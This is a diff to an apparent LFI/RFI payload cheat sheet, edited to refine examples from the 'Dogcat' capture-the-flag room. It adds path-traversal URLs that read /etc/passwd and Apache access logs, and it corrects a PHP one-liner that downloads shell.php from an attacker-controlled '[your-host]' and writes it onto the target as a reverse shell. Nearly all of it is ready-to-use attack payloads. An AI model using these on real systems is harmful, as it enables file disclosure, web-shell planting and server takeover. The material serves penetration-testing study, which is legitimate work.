@@ -117,12 +117,14 @@ When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still pos
 ## LFI CTF THM Dogcat example
 ```powershell
 http://example.com/?view=php://filter/convert.base64-encode/cat/resource=index
-http://example.com/?view=../../../../etc/cat../passwd/&ext=
+http://example.com/?view=../../../../etc/cat/../passwd/&ext=
+http://example.com/?view=dog)../../../../etc/passwd/&ext=
+http://example.com/?view=dog)../../../../../var/log/apache2/access.log&ext=
 http://example.com/?view=../../../../var/log/apache2/cat/../access.log&ext=
 ```
 Uploading a reverse shell using get request
 ```powershell
-<?php file_put_contents('shell.php', file_get_contents('http://[your-host]/shell.php')
+<?php file_put_contents('shell.php', file_get_contents('http://[your-host]/shell.php'))?>
 ```
 ## LFI / RFI using wrappers
 
